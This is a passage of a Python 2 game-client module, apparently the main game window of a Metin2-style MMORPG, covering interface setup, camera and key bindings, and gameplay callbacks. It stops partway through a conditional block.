import app
import chr
import chrmgr
import player
import net
import marek38
import os
import dbg
import grp
import item
import constinfo
import background
import snd
import chat
import textTail
import wndMgr
import systemSetting
import quest
import guild
import skill
import messenger
import exchange
import ime
import serverinfo

import ui
import uicommon
import uiaffectshower
import uiplayergauge
import uitarget
import uiprivateshopbuilder
import mousemodule
import playersettingmodule
import interfacemodule
import musicinfo
import stringcommander
import localeinfo

if app.ENABLE_PVP_ADVANCED:
	import uiduel

if app.__ENABLE_NEW_OFFLINESHOP__:
	import offlineshop
	import uiofflineshop

if app.NEW_PET_SYSTEM:
	import uipetsystem

if app.ENABLE_INGAME_ITEMSHOP:
	import uiitemshop

cameraDistance = 1550.0
cameraPitch = 27.0
cameraRotation = 0.0
cameraHeight = 100.0
testAlignment = 0

class GameWindow(ui.ScriptWindow):
	def __init__(self, stream):
		ui.ScriptWindow.__init__(self, "GAME")
		self.SetWindowName("game")
		net.SetPhaseWindow(net.PHASE_WINDOW_GAME, self)
		player.SetGameWindow(self)
		
		self.quickSlotPageIndex = 0
		self.lastPKModeSendedTime = 0
		self.pressNumber = None
		
		self.guildWarQuestionDialog = None
		self.guildNameBoard = None
		self.partyRequestQuestionDialog = None
		self.partyInviteQuestionDialog = None
		self.guildInviteQuestionDialog = None
		self.messengerAddFriendQuestion = None
		self.itemDropQuestionDialog = None
		self.itemDestroyQuestionDialog = None
		self.confirmDialog = None
		self.removeQuestionDialog = None
		self.interface = None
		self.targetBoard = None
		self.playerGauge = None
		
		if not app.ENABLE_OFFLINESHOP_REWORK:
			if app.__ENABLE_NEW_OFFLINESHOP__:
				self.Offlineshop = uiofflineshop.NewOfflineShopBoard()
				self.Offlineshop.Hide()
		else:
			self.uiSearchShopBtn=ui.Button()
			# self.uiSearchShopBtn.SetUpVisual("cream/btn_search_normal.tga")
			# self.uiSearchShopBtn.SetOverVisual("cream/btn_search_over.tga")
			# self.uiSearchShopBtn.SetDownVisual("cream/btn_search_down.tga")
			self.uiSearchShopBtn.SetPosition((wndMgr.GetScreenWidth()-60)/2, 0)
			self.uiSearchShopBtn.SetEvent(self.OnPressOfflineShopSearch)
			self.uiSearchShopBtn.Show()
		
		self.stream=stream
		
		self.interface = interfacemodule.Interface()
		self.interface.MakeInterface()
		self.interface.ShowDefaultWindows()
		
		import newconstinfo
		newconstinfo.SetGameInstance(self)
		newconstinfo.SetInterfaceInstance(self.interface)
		
		self.targetBoard = uitarget.TargetBoard()
		self.targetBoard.SetWhisperEvent(ui.__mem_func__(self.interface.OpenWhisperDialog))
		self.targetBoard.Hide()
		
		if app.NEW_PET_SYSTEM:
			self.petmain = uipetsystem.PetSystemMain()
			self.petmini = uipetsystem.PetSystemMini()
			self.petmini.BindGameClass(self)
			self.petinc = None
		
		self.affectShower = uiaffectshower.AffectShower()
		
		if app.USE_CAPTCHA_SYSTEM:
			self.interface.SetAffectShower(self.affectShower)
			self.interface.SettargetBoard(self.targetBoard)
		
		if app.ENABLE_PVP_ADVANCED:
			self.wndMsg = None
			self.wndDuelGui = uiduel.Initializate()
			self.wndDuelLive = uiduel.WindowLiveInformations()
		
		self.playerGauge = uiplayergauge.PlayerGauge(self)
		self.playerGauge.Hide()
		
		self.itemDropQuestionDialog = None
		self.itemDestroyQuestionDialog = None
		self.__SetQuickSlotMode()

		self.__ServerCommand_Build()
		self.__ProcessPreservedServerCommand()
		
		if app.INGAME_WIKI:
			import ingamewiki
			self.wndWiki = ingamewiki.InGameWiki()
		
		if app.ENABLE_BIOLOGIST_UI:
			self.biologistAlert = uicommon.PopupDialog()
			self.biologistAlert.SetText(localeinfo.BIOLOGIST_WAIT_FINISH)
		
		(b1, b2, b3, b4, b5, b6, b7) = systemSetting.GetHideModeStatus()
		systemSetting.SetHideModeStatus(0, b1)
		systemSetting.SetHideModeStatus(1, b2)
		systemSetting.SetHideModeStatus(2, b3)
		systemSetting.SetHideModeStatus(3, b4)
		systemSetting.SetHideModeStatus(4, b5)
		systemSetting.SetHideModeStatus(5, b6)
		systemSetting.SetHideModeStatus(6, b7)

	def __del__(self):
		player.SetGameWindow(0)
		net.ClearPhaseWindow(net.PHASE_WINDOW_GAME, self)
		ui.ScriptWindow.__del__(self)

	def Open(self):
		app.SetFrameSkip(1)
		self.SetSize(wndMgr.GetScreenWidth(), wndMgr.GetScreenHeight())
		
		self.quickSlotPageIndex = 0
		self.PickingCharacterIndex = -1
		self.PickingItemIndex = -1
		self.ShowNameFlag = False
		
		self.enableXMasBoom = False
		self.startTimeXMasBoom = 0.0
		self.indexXMasBoom = 0
		
		global cameraDistance, cameraPitch, cameraRotation, cameraHeight
		if app.ENABLE_SAVECAMERA_PREFERENCES:
			import systemSetting
			app.SetCamera(systemSetting.GetCameraHeight(), cameraPitch, cameraRotation, cameraHeight)
		else:
			app.SetCamera(cameraDistance, cameraPitch, cameraRotation, cameraHeight)
		
		if app.ENABLE_SAVECAMERA_PREFERENCES:
			constinfo.SET_CAMERA_MAX_DISTANCE_INDEX(systemSetting.GetCameraType())
		
		constinfo.SET_DEFAULT_CAMERA_MAX_DISTANCE()
		constinfo.SET_DEFAULT_CHRNAME_COLOR()
		constinfo.SET_DEFAULT_FOG_LEVEL()
		#constinfo.SET_DEFAULT_CONVERT_EMPIRE_LANGUAGE_ENABLE()
		constinfo.SET_DEFAULT_USE_ITEM_WEAPON_TABLE_ATTACK_BONUS()
		constinfo.SET_DEFAULT_USE_SKILL_EFFECT_ENABLE()
		constinfo.SET_TWO_HANDED_WEAPON_ATT_SPEED_DECREASE_VALUE()
		
		import event
		event.SetLeftTimeString(localeinfo.UI_LEFT_TIME)
		
		textTail.EnablePKTitle(constinfo.PVPMODE_ENABLE)
		
		self.__BuildKeyDict()
		
		uiprivateshopbuilder.Clear()
		
		exchange.InitTrading()
		
		if app.ENABLE_ULTIMATE_REGEN:
			player.LoadNewRegen()
		
		snd.SetMusicVolume(systemSetting.GetMusicVolume()*net.GetFieldMusicVolume())
		snd.SetSoundVolume(systemSetting.GetSoundVolume())
		
		if app.USE_FOG_FIX:
			background.SetFogMode(systemSetting.GetFogMode())
		
		netFieldMusicFileName = net.GetFieldMusicFileName()
		if netFieldMusicFileName:
			snd.FadeInMusic("bgm/" + netFieldMusicFileName)
		elif musicinfo.fieldMusic != "":
			snd.FadeInMusic("bgm/" + musicinfo.fieldMusic)
		
		self.__SetQuickSlotMode()
		self.__SelectQuickPage(self.quickSlotPageIndex)
		
		self.SetFocus()
		self.Show()
		app.ShowCursor()
		net.SendEnterGamePacket()
		
		try:
			self.StartGame()
		except:
			import exception
			exception.Abort("GameWindow.Open")
		
		mousemodule.mouseController.CreateNumberLine()
		self.cubeInformation = {}
		self.currentCubeNPC = 0
		if app.USE_ENVIRONMENT_OPTIONS:
			if systemSetting.GetNightModeOption():
				if not background.IsBoomMap():
					return
				
				background.RegisterEnvironmentData(background.DAY_MODE_DARK, constinfo.ENVIRONMENT_NIGHT)
				background.SetEnvironmentData(background.DAY_MODE_DARK)
		else:
			background.SetEnvironmentData(background.DAY_MODE_LIGHT)

	def Close(self):
		self.Hide()
		global cameraDistance, cameraPitch, cameraRotation, cameraHeight
		(cameraDistance, cameraPitch, cameraRotation, cameraHeight) = app.GetCamera()
		
		if musicinfo.fieldMusic != "":
			snd.FadeOutMusic("bgm/"+ musicinfo.fieldMusic)
		
		self.onPressKeyDict = None
		self.onClickKeyDict = None
		
		chat.Close()
		snd.StopAllSound()
		grp.InitScreenEffect()
		chr.Destroy()
		textTail.Clear()
		quest.Clear()
		background.Destroy()
		guild.Destroy()
		messenger.Destroy()
		skill.ClearSkillData()
		wndMgr.Unlock()
		mousemodule.mouseController.DeattachObject()
		
		if self.guildWarQuestionDialog:
			self.guildWarQuestionDialog.Close()
			del self.guildWarQuestionDialog
			self.guildWarQuestionDialog = None
		
		if self.guildNameBoard:
			self.guildNameBoard.Close()
			del self.guildNameBoard
			self.guildNameBoard = None
		
		if self.partyRequestQuestionDialog:
			self.partyRequestQuestionDialog.Close()
			del self.partyRequestQuestionDialog
			self.partyRequestQuestionDialog = None
		
		if self.partyInviteQuestionDialog:
			self.partyInviteQuestionDialog.Close()
			del self.partyInviteQuestionDialog
			self.partyInviteQuestionDialog = None
		
		if self.guildInviteQuestionDialog:
			self.guildInviteQuestionDialog.Close()
			del self.guildInviteQuestionDialog
			self.guildInviteQuestionDialog = None
		
		if self.messengerAddFriendQuestion:
			self.messengerAddFriendQuestion.Close()
			del self.messengerAddFriendQuestion
			self.messengerAddFriendQuestion = None
		
		if self.itemDropQuestionDialog:
			self.itemDropQuestionDialog.Close()
			del self.itemDropQuestionDialog
			self.itemDropQuestionDialog = None
		
		if self.itemDestroyQuestionDialog:
			self.itemDestroyQuestionDialog.Close()
			del self.itemDestroyQuestionDialog
			self.itemDestroyQuestionDialog = None
		
		if self.confirmDialog:
			self.confirmDialog.Close()
			del self.confirmDialog
			self.confirmDialog = None
		
		if self.removeQuestionDialog:
			self.removeQuestionDialog.Close()
			del self.removeQuestionDialog
			self.removeQuestionDialog = None
		
		if app.INGAME_WIKI:
			if self.wndWiki:
				self.wndWiki.Hide()
				del self.wndWiki
				self.wndWiki = None
		
		if not app.ENABLE_OFFLINESHOP_REWORK:
			if app.__ENABLE_NEW_OFFLINESHOP__:
				if self.Offlineshop:
					self.Offlineshop.Destroy()
					del self.Offlineshop
					self.Offlineshop = None
		else:
			if self.uiSearchShopBtn:
				del self.uiSearchShopBtn
				self.uiSearchShopBtn=0
		
		if app.NEW_PET_SYSTEM:
			if self.petmain:
				self.petmain.Close()
				del self.petmain
				self.petmain = None
			
			if self.petmini:
				self.petmini.Close()
				del self.petmini
				self.petmini = None
			
			if self.petinc:
				self.petinc.Close()
				del self.petinc
				self.petinc = None
		
		if self.affectShower:
			del self.affectShower
			self.affectShower = None
		
		if self.playerGauge:
			del self.playerGauge
			self.playerGauge = None
		
		if app.ENABLE_PVP_ADVANCED:
			if self.wndDuelLive:
				self.wndDuelLive.Close()
				del self.wndDuelLive
				self.wndDuelLive = None
			
			if self.wndMsg:
				self.wndMsg.Close()
				del self.wndMsg
				self.wndMsg = None
		
		if self.targetBoard:
			self.targetBoard.Destroy()
			del self.targetBoard
			self.targetBoard = None
		
		if app.ENABLE_BIOLOGIST_UI:
			if self.biologistAlert:
				self.biologistAlert.Destroy()
				del self.biologistAlert
				self.biologistAlert = None
		
		if self.interface:
			self.interface.HideAllWindows()
			self.interface.Close()
			del self.interface
			self.interface = None
		
		import newconstinfo
		newconstinfo.SetInterfaceInstance(None)
		newconstinfo.SetGameInstance(None)
		
		self.ClearDictionary()
		
		player.ClearSkillDict()
		player.ResetCameraRotation()
		
		self.KillFocus()
		app.HideCursor()
		constinfo.SET_ITEM_QUESTION_DIALOG_STATUS(0)
		mousemodule.mouseController.Destroy()
		print "---------------------------------------------------------------------------- CLOSE GAME WINDOW"

	if app.ENABLE_RANKING:
		def OpenRanking(self):
			try:
				self.interface.OpenRanking()
			except Exception as e:
				dbg.TraceError(str(e))

		def RankingClearData(self):
			try:
				self.interface.RankingClearData()
			except Exception as e:
				dbg.TraceError(str(e))

		def RankingAddRank(self, position, level, points, name, realPosition):
			try:
				self.interface.RankingAddRank(position, level, points, name, realPosition)
			except Exception as e:
				dbg.TraceError(str(e))

		def RankingRefresh(self):
			try:
				self.interface.RankingRefresh()
			except Exception as e:
				dbg.TraceError(str(e))

	def __BuildKeyDict(self):
		onPressKeyDict = {}
		onPressKeyDict[app.DIK_1] = lambda : self.__PressNumKey(1)
		onPressKeyDict[app.DIK_2] = lambda : self.__PressNumKey(2)
		onPressKeyDict[app.DIK_3] = lambda : self.__PressNumKey(3)
		onPressKeyDict[app.DIK_4] = lambda : self.__PressNumKey(4)
		onPressKeyDict[app.DIK_5] = lambda : self.__PressNumKey(5)
		onPressKeyDict[app.DIK_6] = lambda : self.__PressNumKey(6)
		onPressKeyDict[app.DIK_7] = lambda : self.__PressNumKey(7)
		onPressKeyDict[app.DIK_8] = lambda : self.__PressNumKey(8)
		onPressKeyDict[app.DIK_9] = lambda : self.__PressNumKey(9)
		onPressKeyDict[app.DIK_F1] = lambda : self.__PressQuickSlot(4)
		onPressKeyDict[app.DIK_F2] = lambda : self.__PressQuickSlot(5)
		onPressKeyDict[app.DIK_F3] = lambda : self.__PressQuickSlot(6)
		onPressKeyDict[app.DIK_F4] = lambda : self.__PressQuickSlot(7)
		# onPressKeyDict[app.DIK_F12] = lambda : self.OpenRanking()
		onPressKeyDict[app.DIK_LALT] = lambda : self.ShowName()
		onPressKeyDict[app.DIK_LCONTROL] = lambda : self.ShowMouseImage()
		onPressKeyDict[app.DIK_SYSRQ] = lambda : self.SaveScreen()
		onPressKeyDict[app.DIK_SPACE] = lambda : self.StartAttack()
		onPressKeyDict[app.DIK_UP] = lambda : self.MoveUp()
		onPressKeyDict[app.DIK_DOWN] = lambda : self.MoveDown()
		onPressKeyDict[app.DIK_LEFT] = lambda : self.MoveLeft()
		onPressKeyDict[app.DIK_RIGHT] = lambda : self.MoveRight()
		onPressKeyDict[app.DIK_W] = lambda : self.MoveUp()
		onPressKeyDict[app.DIK_S] = lambda : self.MoveDown()

		if app.USE_AUTO_HUNT:
			onPressKeyDict[app.DIK_A] = lambda : self.MoveLeftAlt()
		else:
			onPressKeyDict[app.DIK_A] = lambda : self.MoveLeft()

		onPressKeyDict[app.DIK_D] = lambda : self.MoveRight()
		onPressKeyDict[app.DIK_E] = lambda: app.RotateCamera(app.CAMERA_TO_POSITIVE)
		onPressKeyDict[app.DIK_R] = lambda: app.ZoomCamera(app.CAMERA_TO_NEGATIVE)
		onPressKeyDict[app.DIK_T] = lambda: app.PitchCamera(app.CAMERA_TO_NEGATIVE)
		onPressKeyDict[app.DIK_G] = self.__PressGKey
		onPressKeyDict[app.DIK_Q] = self.__PressQKey
		onPressKeyDict[app.DIK_NUMPAD9] = lambda: app.MovieResetCamera()
		onPressKeyDict[app.DIK_NUMPAD4] = lambda: app.MovieRotateCamera(app.CAMERA_TO_NEGATIVE)
		onPressKeyDict[app.DIK_NUMPAD6] = lambda: app.MovieRotateCamera(app.CAMERA_TO_POSITIVE)
		onPressKeyDict[app.DIK_PGUP] = lambda: app.MovieZoomCamera(app.CAMERA_TO_NEGATIVE)
		onPressKeyDict[app.DIK_PGDN] = lambda: app.MovieZoomCamera(app.CAMERA_TO_POSITIVE)
		onPressKeyDict[app.DIK_NUMPAD8] = lambda: app.MoviePitchCamera(app.CAMERA_TO_NEGATIVE)
		onPressKeyDict[app.DIK_NUMPAD2] = lambda: app.MoviePitchCamera(app.CAMERA_TO_POSITIVE)
		onPressKeyDict[app.DIK_GRAVE] = lambda : self.PickUpItem()
		onPressKeyDict[app.DIK_Z] = lambda : self.PickUpItem()
		onPressKeyDict[app.DIK_C] = lambda state = "STATUS": self.interface.ToggleCharacterWindow(state)
		onPressKeyDict[app.DIK_V] = lambda state = "SKILL": self.interface.ToggleCharacterWindow(state)
		onPressKeyDict[app.DIK_N] = lambda state = "QUEST": self.interface.ToggleCharacterWindow(state)
		onPressKeyDict[app.DIK_I] = lambda : self.interface.ToggleInventoryWindow()
		onPressKeyDict[app.DIK_O] = lambda : self.interface.ToggleDragonSoulWindowWithNoInfo()
		onPressKeyDict[app.DIK_M] = lambda : self.interface.PressMKey()
		onPressKeyDict[app.DIK_ADD] = lambda : self.interface.MiniMapScaleUp()
		onPressKeyDict[app.DIK_SUBTRACT] = lambda : self.interface.MiniMapScaleDown()
		onPressKeyDict[app.DIK_L] = lambda : self.interface.ToggleChatLogWindow()
		onPressKeyDict[app.DIK_LSHIFT] = lambda : self.__SetQuickPageMode()
		onPressKeyDict[app.DIK_J] = lambda : self.__PressJKey()
		onPressKeyDict[app.DIK_H] = lambda : self.__PressHKey()
		onPressKeyDict[app.DIK_B] = lambda : self.__PressBKey()
		onPressKeyDict[app.DIK_F] = lambda : self.__PressFKey()
		
		# if app.NEW_PET_SYSTEM:
			# onPressKeyDict[app.DIK_P] = lambda: self.OpenPetMainGui()

		if app.ENABLE_REWARD_SYSTEM:
			onPressKeyDict[app.DIK_F5]	= lambda : self.interface.OpenRewardWindow()
		
		if app.ENABLE_EVENT_MANAGER:
			onPressKeyDict[app.DIK_F6]	= lambda : self.interface.OpenEventCalendar()
		
		if app.ENABLE_DUNGEON_INFO_SYSTEM:
			onPressKeyDict[app.DIK_F7] = lambda : self.OpenDungeoninfo()
		
		if app.USE_BATTLEPASS:
			onPressKeyDict[app.DIK_F8] = lambda : self.interface.ToggleBattlePassExtended()
		
		if app.ENABLE_WHISPER_ADMIN_SYSTEM:
			onPressKeyDict[app.DIK_F9] = lambda : self.OpenWhisperSystem()
		
		# if app.ENABLE_PVP_ADVANCED:
			# onPressKeyDict[app.DIK_F5] = lambda : self.ClickPvpEquipment()
		
		if app.ENABLE_EXTRA_INVENTORY:
			onPressKeyDict[app.DIK_U] = lambda : self.OpenExtrainventory()
		
		self.onPressKeyDict = onPressKeyDict

		onClickKeyDict = {}
		onClickKeyDict[app.DIK_UP] = lambda : self.StopUp()
		onClickKeyDict[app.DIK_DOWN] = lambda : self.StopDown()
		onClickKeyDict[app.DIK_LEFT] = lambda : self.StopLeft()
		onClickKeyDict[app.DIK_RIGHT] = lambda : self.StopRight()
		onClickKeyDict[app.DIK_SPACE] = lambda : self.EndAttack()
		onClickKeyDict[app.DIK_W] = lambda : self.StopUp()
		onClickKeyDict[app.DIK_S] = lambda : self.StopDown()
		onClickKeyDict[app.DIK_A] = lambda : self.StopLeft()
		onClickKeyDict[app.DIK_D] = lambda : self.StopRight()
		onClickKeyDict[app.DIK_Q] = lambda: app.RotateCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_E] = lambda: app.RotateCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_R] = lambda: app.ZoomCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_F] = lambda: app.ZoomCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_T] = lambda: app.PitchCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_G] = lambda: self.__ReleaseGKey()
		onClickKeyDict[app.DIK_NUMPAD4] = lambda: app.MovieRotateCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_NUMPAD6] = lambda: app.MovieRotateCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_PGUP] = lambda: app.MovieZoomCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_PGDN] = lambda: app.MovieZoomCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_NUMPAD8] = lambda: app.MoviePitchCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_NUMPAD2] = lambda: app.MoviePitchCamera(app.CAMERA_STOP)
		onClickKeyDict[app.DIK_LALT] = lambda: self.HideName()
		onClickKeyDict[app.DIK_LCONTROL] = lambda: self.HideMouseImage()
		onClickKeyDict[app.DIK_LSHIFT] = lambda: self.__SetQuickSlotMode()
		self.onClickKeyDict = onClickKeyDict

	def __PressNumKey(self, num):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			if num >= 1 and num <= 9:
				if chrmgr.IsPossibleEmoticon(-1):
					chrmgr.SetEmoticon(-1, int(num)-1)
					net.SendEmoticon(int(num)-1)
		else:
			if num >= 1 and num <= 4:
				self.pressNumber(num-1)

	def __ClickBKey(self):
		if not app.IsPressed(app.DIK_LCONTROL) and not app.IsPressed(app.DIK_RCONTROL):
			self.ChangePKMode()

	def	__PressJKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			if player.IsMountingHorse():
				net.SendChatPacket("/unmount")
			else:
				if not uiprivateshopbuilder.IsBuildingPrivateShop():
					for i in xrange(player.INVENTORY_PAGE_SIZE*player.INVENTORY_PAGE_COUNT):
						if player.GetItemIndex(i) in (71114, 71116, 71118, 71120):
							net.SendItemUsePacket(i)
							break

	def	__PressHKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			net.SendChatPacket("/ride")
		elif app.INGAME_WIKI:
			try:
				self.interface.ToggleWikiNew()
			except Exception as e:
				dbg.TraceError(str(e))

	def	__PressBKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			net.SendChatPacket("/user_horse_back")
		else:
			try:
				self.interface.ToggleCharacterWindow("EMOTICON")
			except Exception as e:
				dbg.TraceError(str(e))

	def	__PressFKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			net.SendChatPacket("/user_horse_feed")
		else:
			app.ZoomCamera(app.CAMERA_TO_POSITIVE)

	def __PressGKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			net.SendChatPacket("/ride")
		else:
			if self.ShowNameFlag:
				try:
					self.interface.ToggleGuildWindow()
				except Exception as e:
					dbg.TraceError(str(e))
			else:
				app.PitchCamera(app.CAMERA_TO_POSITIVE)

	def	__ReleaseGKey(self):
		app.PitchCamera(app.CAMERA_STOP)

	def __PressQKey(self):
		if app.IsPressed(app.DIK_LCONTROL) or app.IsPressed(app.DIK_RCONTROL):
			if 0 == interfacemodule.IsQBHide:
				interfacemodule.IsQBHide = 1
				self.interface.HideAllQuestButton()
			else:
				interfacemodule.IsQBHide = 0
				self.interface.ShowAllQuestButton()
		else:
			app.RotateCamera(app.CAMERA_TO_NEGATIVE)

	def __SetQuickSlotMode(self):
		self.pressNumber = ui.__mem_func__(self.__PressQuickSlot)

	def __SetQuickPageMode(self):
		self.pressNumber = ui.__mem_func__(self.__SelectQuickPage)

	def __PressQuickSlot(self, localSlotIndex):
		if localeinfo.IsARABIC():
			if 0 <= localSlotIndex and localSlotIndex < 4:
				player.RequestUseLocalQuickSlot(3-localSlotIndex)
			else:
				player.RequestUseLocalQuickSlot(11-localSlotIndex)
		else:
			player.RequestUseLocalQuickSlot(localSlotIndex)

	def __SelectQuickPage(self, pageIndex):
		self.quickSlotPageIndex = pageIndex
		player.SetQuickPage(pageIndex)

	def __NotifyError(self, msg):
		chat.AppendChat(chat.CHAT_TYPE_INFO, msg)

	def ChangePKMode(self):
		if not app.IsPressed(app.DIK_LCONTROL):
			return

		if player.GetStatus(player.LEVEL)<constinfo.PVPMODE_PROTECTED_LEVEL:
			self.__NotifyError(localeinfo.OPTION_PVPMODE_PROTECT % (constinfo.PVPMODE_PROTECTED_LEVEL))
			return

		curTime = app.GetTime()
		if curTime - self.lastPKModeSendedTime < constinfo.PVPMODE_ACCELKEY_DELAY:
			return

		self.lastPKModeSendedTime = curTime

		curPKMode = player.GetPKMode()
		nextPKMode = curPKMode + 1
		if nextPKMode == player.PK_MODE_PROTECT:
			if 0 == player.GetGuildID():
				chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.OPTION_PVPMODE_CANNOT_SET_GUILD_MODE)
				nextPKMode = 0
			else:
				nextPKMode = player.PK_MODE_GUILD

		elif nextPKMode == player.PK_MODE_MAX_NUM:
			nextPKMode = 0

		net.SendChatPacket("/PKMode " + str(nextPKMode))
		print "/PKMode " + str(nextPKMode)

	def OnChangePKMode(self):
		try:
			self.interface.OnChangePKMode()
		except:
			pass

		try:
			self.__NotifyError(localeinfo.OPTION_PVPMODE_MESSAGE_DICT[player.GetPKMode()])
		except KeyError:
			print "UNKNOWN PVPMode[%d]" % (player.GetPKMode())

	###############################################################################################
	###############################################################################################
	## Game Callback Functions

	# Start
	def StartGame(self):
		self.RefreshInventory()
		self.RefreshEquipment()
		self.RefreshCharacter()
		self.RefreshSkill()

	# Refresh
	def CheckGameButton(self):
		if self.interface:
			self.interface.CheckGameButton()

	def RefreshAlignment(self):
		self.interface.RefreshAlignment()

	def RefreshStatus(self):
		self.CheckGameButton()

		if self.interface:
			self.interface.RefreshStatus()

		if self.playerGauge:
			self.playerGauge.RefreshGauge()

	def RefreshStamina(self):
		self.interface.RefreshStamina()

	def RefreshSkill(self):
		self.CheckGameButton()
		if self.interface:
			self.interface.RefreshSkill()

	def RefreshQuest(self):
		self.interface.RefreshQuest()

	def RefreshMessenger(self):
		self.interface.RefreshMessenger()

	def RefreshGuildInfoPage(self):
		self.interface.RefreshGuildInfoPage()

	def RefreshGuildBoardPage(self):
		self.interface.RefreshGuildBoardPage()

	def RefreshGuildMemberPage(self):
		self.interface.RefreshGuildMemberPage()

	def RefreshGuildMemberPageGradeComboBox(self):
		self.interface.RefreshGuildMemberPageGradeComboBox()

	def RefreshGuildSkillPage(self):
		self.interface.RefreshGuildSkillPage()

	def RefreshGuildGradePage(self):
		self.interface.RefreshGuildGradePage()

	def RefreshMobile(self):
		if self.interface:
			self.interface.RefreshMobile()

	def OnMobileAuthority(self):
		self.interface.OnMobileAuthority()

	def OnBlockMode(self, mode):
		self.interface.OnBlockMode(mode)

	def OpenQuestWindow(self, skin, idx):
		self.interface.OpenQuestWindow(skin, idx)

	def AskGuildName(self):

		guildNameBoard = uicommon.InputDialog()
		guildNameBoard.SetTitle(localeinfo.GUILD_NAME)
		guildNameBoard.SetAcceptEvent(ui.__mem_func__(self.ConfirmGuildName))
		guildNameBoard.SetCancelEvent(ui.__mem_func__(self.CancelGuildName))
		guildNameBoard.Open()

		self.guildNameBoard = guildNameBoard

	def ConfirmGuildName(self):
		guildName = self.guildNameBoard.GetText()
		if not guildName:
			return

		if net.IsInsultIn(guildName):
			self.PopupMessage(localeinfo.GUILD_CREATE_ERROR_INSULT_NAME)
			return

		net.SendAnswerMakeGuildPacket(guildName)
		self.guildNameBoard.Close()
		self.guildNameBoard = None
		return True

	def CancelGuildName(self):
		self.guildNameBoard.Close()
		self.guildNameBoard = None
		return True

	## Refine
	def PopupMessage(self, msg):
		self.stream.popupWindow.Close()
		self.stream.popupWindow.Open(msg, 0, localeinfo.UI_OK)

	def OpenRefineDialog(self, targetItemPos, nextGradeItemVnum, cost, prob, type=0):
		self.interface.OpenRefineDialog(targetItemPos, nextGradeItemVnum, cost, prob, type)

	def AppendMaterialToRefineDialog(self, vnum, count):
		self.interface.AppendMaterialToRefineDialog(vnum, count)

	def RunUseSkillEvent(self, slotIndex, coolTime):
		self.interface.OnUseSkill(slotIndex, coolTime)

	def ClearAffects(self):
		self.affectShower.ClearAffects()

	def SetAffect(self, affect):
		self.affectShower.SetAffect(affect)

	def ResetAffect(self, affect):
		self.affectShower.ResetAffect(affect)

	def BINARY_NEW_AddAffect(self, type, pointIdx, value, duration):
		try:
			self.affectShower.BINARY_NEW_AddAffect(type, pointIdx, value, duration)
			if chr.NEW_AFFECT_DRAGON_SOUL_DECK1 == type or chr.NEW_AFFECT_DRAGON_SOUL_DECK2 == type:
				self.interface.DragonSoulActivate(type - chr.NEW_AFFECT_DRAGON_SOUL_DECK1)
			elif app.ENABLE_DS_SET and type == chr.NEW_AFFECT_DS_SET and self.interface:
				self.interface.SetDSSet(value)
		except:
			pass

	def BINARY_NEW_RemoveAffect(self, type, pointIdx):		
		self.affectShower.BINARY_NEW_RemoveAffect(type, pointIdx)
		if chr.NEW_AFFECT_DRAGON_SOUL_DECK1 == type or chr.NEW_AFFECT_DRAGON_SOUL_DECK2 == type:
			self.interface.DragonSoulDeactivate()
		elif app.ENABLE_DS_SET and type == chr.NEW_AFFECT_DS_SET and self.interface:
			self.interface.SetDSSet(0)

	def ActivateSkillSlot(self, slotIndex):
		if self.interface:
			self.interface.OnActivateSkill(slotIndex)

	def DeactivateSkillSlot(self, slotIndex):
		if self.interface:
			self.interface.OnDeactivateSkill(slotIndex)

	def RefreshEquipment(self):
		if self.interface:
			self.interface.RefreshInventory()

	def RefreshInventory(self):
		if self.interface:
			self.interface.RefreshInventory()

			if app.USE_AUTO_HUNT:
				self.interface.RefreshAutoPotionSlot()

	def BINARY_RefreshInventoryCell(self, slotIndex):
		if self.interface:
			self.interface.RefreshInventoryCell(slotIndex)

	def RefreshCharacter(self):
		if self.interface:
			self.interface.RefreshCharacter()

	def OnGameOver(self):
		self.CloseTargetBoard()
		self.OpenRestartDialog()

		if app.USE_AUTO_HUNT:
			self.interface.OnGameOver()

	def OpenRestartDialog(self):
		self.interface.OpenRestartDialog()

	def ChangeCurrentSkill(self, skillSlotNumber):
		self.interface.OnChangeCurrentSkill(skillSlotNumber)

	## TargetBoard
	def SetPCTargetBoard(self, vid, name):
		self.targetBoard.Open(vid, name)

		if app.IsPressed(app.DIK_LCONTROL):

			if not player.IsSameEmpire(vid):
				return

			if player.IsMainCharacterIndex(vid):
				return
			elif chr.INSTANCE_TYPE_BUILDING == chr.GetInstanceType(vid):
				return

			self.interface.OpenWhisperDialog(name)


	def RefreshTargetBoardByVID(self, vid):
		self.targetBoard.RefreshByVID(vid)

	def RefreshTargetBoardByName(self, name):
		self.targetBoard.RefreshByName(name)

	def __RefreshTargetBoard(self):
		self.targetBoard.Refresh()

	
	if app.ENABLE_VIEW_TARGET_DECIMAL_HP:
		if app.ENABLE_VIEW_ELEMENT:
			def SetHPTargetBoard(self, vid, hpPercentage, iMinHP, iMaxHP, bElement):
				if vid != self.targetBoard.GetTargetVID():
					self.targetBoard.ResetTargetBoard()
					self.targetBoard.SetEnemyVID(vid)
				
				self.targetBoard.SetHP(hpPercentage, iMinHP, iMaxHP)
				self.targetBoard.SetElementImage(bElement)
				self.targetBoard.Show()
		else:
			def SetHPTargetBoard(self, vid, hpPercentage, iMinHP, iMaxHP):
				if vid != self.targetBoard.GetTargetVID():
					self.targetBoard.ResetTargetBoard()
					self.targetBoard.SetEnemyVID(vid)

				self.targetBoard.SetHP(hpPercentage, iMinHP, iMaxHP)
				self.targetBoard.Show()
	else:
		if app.ENABLE_VIEW_ELEMENT:
